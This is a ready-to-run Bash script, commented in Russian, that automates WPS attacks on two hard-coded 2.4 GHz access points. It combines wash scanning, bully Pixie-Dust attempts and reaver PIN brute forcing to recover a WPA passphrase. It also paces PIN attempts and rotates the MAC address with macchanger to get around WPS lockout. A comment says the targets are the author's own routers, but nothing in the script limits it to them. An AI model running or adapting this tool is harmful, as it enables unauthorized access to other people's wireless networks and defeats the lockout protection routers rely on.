#!/usr/bin/env bash
set -euo pipefail

# Мягкий WPS на своих 2.4 AP (без handshake). Только USB monitor-интерфейс.
MON_IF="${MON_IF:-wlp199s0f3u1mon}"
PHY_IF="${PHY_IF:-wlp199s0f3u1}"
LOG="${LOG:-/home/darkrogua/wps-soft.log}"
SESSION_DIR="${SESSION_DIR:-/tmp/wps-soft-sessions}"
# Задержка между PIN (сек); пауза lockout; каждые N PIN — доп. пауза M сек (reaver -r M:N)
PIN_DELAY="${PIN_DELAY:-18}"
LOCK_DELAY="${LOCK_DELAY:-420}"
RECURRING="${RECURRING:-240:2}"
# Сколько новых PIN за один запуск (0 = без лимита, осторожно)
MAX_PINS="${MAX_PINS:-8}"
PIXIE_ONCE_SEC="${PIXIE_ONCE_SEC:-90}"
MODE="${MODE:-both}" # pixie | pin | both | bully-pin
TARGET="${TARGET:-all}" # all | beeline | rsk3off
SKIP_WASH="${SKIP_WASH:-0}"
LOCKWAIT="${LOCKWAIT:-180}"
PRE_ROTATE_MAC="${PRE_ROTATE_MAC:-1}"
WAIT_UNLOCK="${WAIT_UNLOCK:-0}"
WAIT_UNLOCK_MAX="${WAIT_UNLOCK_MAX:-7200}"
WAIT_STEP="${WAIT_STEP:-300}"

if [[ "${EUID}" -ne 0 ]]; then
  echo "Запусти: sudo $0   (MODE=pin MAX_PINS=5 …)" >&2
  exit 1
fi

if ! ip link show "$MON_IF" &>/dev/null; then
  ip link set "$PHY_IF" down
  iw dev "$PHY_IF" set type monitor
  ip link set "$PHY_IF" up
  MON_IF="$PHY_IF"
fi

mkdir -p "$SESSION_DIR"
log() { echo "[$(date -Iseconds)] $*" | tee -a "$LOG"; }

if [[ "$SKIP_WASH" == "1" ]]; then
  log "=== wash пропущен (SKIP_WASH=1) ==="
else
  log "=== wash 2.4 (90 с, фикс. hop 1-13) на $MON_IF ==="
  for ch in $(seq 1 13); do
    iw dev "$MON_IF" set channel "$ch" 2>/dev/null || true
    sleep 2
  done &
  hop_pid=$!
  timeout 90 wash -i "$MON_IF" 2>&1 | tee -a "$LOG" || true
  wait "$hop_pid" 2>/dev/null || true
fi

# Только 2.4 GHz
targets=(
  "rsk3off|00:31:92:CF:FD:1E|2|rsk3off"
  "beeline|74:9D:79:55:54:1A|1|Beeline_2G_FF2F54"
)

filter_targets() {
  [[ "$TARGET" == "all" ]] && return 0
  [[ "$1" == "$TARGET" ]]
}

try_pixie_once() {
  local bssid="$1" ch="$2" essid="$3" tag="$4"
  local workdir="${SESSION_DIR}/bully-${tag}"
  mkdir -p "$workdir"

  log "=== Pixie (1 попытка, без brute): $essid $bssid ch$ch ==="
  iw dev "$MON_IF" set channel "$ch"

  timeout "$PIXIE_ONCE_SEC" bully \
    -b "$bssid" \
    -e "$essid" \
    -c "$ch" \
    -d \
    -v 3 \
    -l 90 \
    -1 8,1 \
    -2 12,1 \
    -r 2 \
    -w "$workdir" \
    "$MON_IF" \
    2>&1 | tee -a "$LOG" || true
}

soft_bully_pin() {
  local bssid="$1" ch="$2" essid="$3" tag="$4"
  local workdir="${SESSION_DIR}/bully-pin-${tag}"
  mkdir -p "$workdir"

  log "=== Мягкий PIN (bully, без pixie): $essid $bssid ch$ch lockwait=${LOCKWAIT}s ==="
  iw dev "$MON_IF" set channel "$ch"
  [[ "$WAIT_UNLOCK" == "1" ]] && wait_wps_unlock "$bssid" "$ch" "$essid"
  [[ "$PRE_ROTATE_MAC" == "1" ]] && rotate_mac

  # Один PIN за запуск ≈ lockwait + задержки на M5/M7; не спамим M1.
  timeout "${BULLY_PIN_SEC:-600}" bully \
    -b "$bssid" \
    -e "$essid" \
    -c "$ch" \
    -v 3 \
    -l "$LOCKWAIT" \
    -1 12,2 \
    -2 25,1 \
    -r 2 \
    -w "$workdir" \
    "$MON_IF" \
    2>&1 | tee -a "$LOG" || true
}

soft_pin() {
  local bssid="$1" ch="$2" essid="$3" tag="$4"
  local sess="${SESSION_DIR}/reaver-${tag}.wps"

  log "=== Мягкий PIN (reaver): $essid $bssid ch$ch delay=${PIN_DELAY}s lock=${LOCK_DELAY}s recurring=${RECURRING} max=${MAX_PINS} ==="
  iw dev "$MON_IF" set channel "$ch"

  local extra=()
  [[ "$MAX_PINS" != "0" ]] && extra+=(-g "$MAX_PINS")

  reaver \
    -i "$MON_IF" \
    -b "$bssid" \
    -e "$essid" \
    -c "$ch" \
    -s "$sess" \
    -w \
    -a \
    -d "$PIN_DELAY" \
    -l "$LOCK_DELAY" \
    -r "$RECURRING" \
    -t 12 \
    -T 1.5 \
    -x 120 \
    -S \
    -vv \
    "${extra[@]}" \
    2>&1 | tee -a "$LOG" || true

  if grep -qiE 'WPA PSK|WPS PIN:' "$LOG" 2>/dev/null; then
    log ">>> Возможный успех — проверь последние строки лога"
  fi
}

rotate_mac() {
  log "Смена MAC на $MON_IF (down → macchanger → up)"
  ip link set "$MON_IF" down
  macchanger -r "$MON_IF" 2>&1 | tee -a "$LOG" || true
  ip link set "$MON_IF" up
}

wait_wps_unlock() {
  local bssid="$1" ch="$2" essid="$3"
  local elapsed=0
  local bssid_lc="${bssid,,}"

  iw dev "$MON_IF" set channel "$ch"
  while (( elapsed < WAIT_UNLOCK_MAX )); do
    local line
    line="$(timeout 25 wash -i "$MON_IF" 2>/dev/null | grep -i "${bssid_lc//:/}" | head -1 || true)"
    if [[ -n "$line" ]] && echo "$line" | grep -qE 'No[[:space:]]+'"${essid// /[[:space:]]}"; then
      log "WPS в beacon разблокирован для $essid"
      return 0
    fi
    if [[ -n "$line" ]] && echo "$line" | grep -qiE '[[:space:]]Yes[[:space:]]'; then
      log "WPS locked ($essid), жду ${WAIT_STEP}s (прошло ${elapsed}s)"
      sleep "$WAIT_STEP"
      elapsed=$((elapsed + WAIT_STEP))
      continue
    fi
    log "wash: нет строки для $essid, жду ${WAIT_STEP}s"
    sleep "$WAIT_STEP"
    elapsed=$((elapsed + WAIT_STEP))
  done
  log "Таймаут ожидания unlock ${WAIT_UNLOCK_MAX}s — пробуем осторожно"
  return 0
}

on_lock_hint() {
  if tail -40 "$LOG" | grep -qiE 'lockout|WPS lock|WPSFail'; then
    log "Lockout WPS — пауза ${LOCK_DELAY}s рекомендована перед следующим PIN"
    rotate_mac || true
  fi
}

for entry in "${targets[@]}"; do
  IFS='|' read -r id bssid ch essid <<<"$entry"
  tag="${id}"

  filter_targets "$id" || continue

  case "$MODE" in
    pixie) try_pixie_once "$bssid" "$ch" "$essid" "$tag" ;;
    pin) soft_pin "$bssid" "$ch" "$essid" "$tag" ;;
    bully-pin) soft_bully_pin "$bssid" "$ch" "$essid" "$tag" ;;
    both)
      try_pixie_once "$bssid" "$ch" "$essid" "$tag"
      # Beeline часто рвёт M1/EAPOL — для него только pixie, PIN через bully вручную
      if [[ "$id" == "rsk3off" ]]; then
        soft_bully_pin "$bssid" "$ch" "$essid" "$tag"
      else
        log "Пропуск агрессивного PIN на $essid (только pixie; при необходимости MODE=bully-pin TARGET=beeline)"
      fi
      ;;
    *) echo "MODE: pixie | pin | both | bully-pin" >&2; exit 1 ;;
  esac
  on_lock_hint
done

log "=== готово: $LOG сессии: $SESSION_DIR ==="
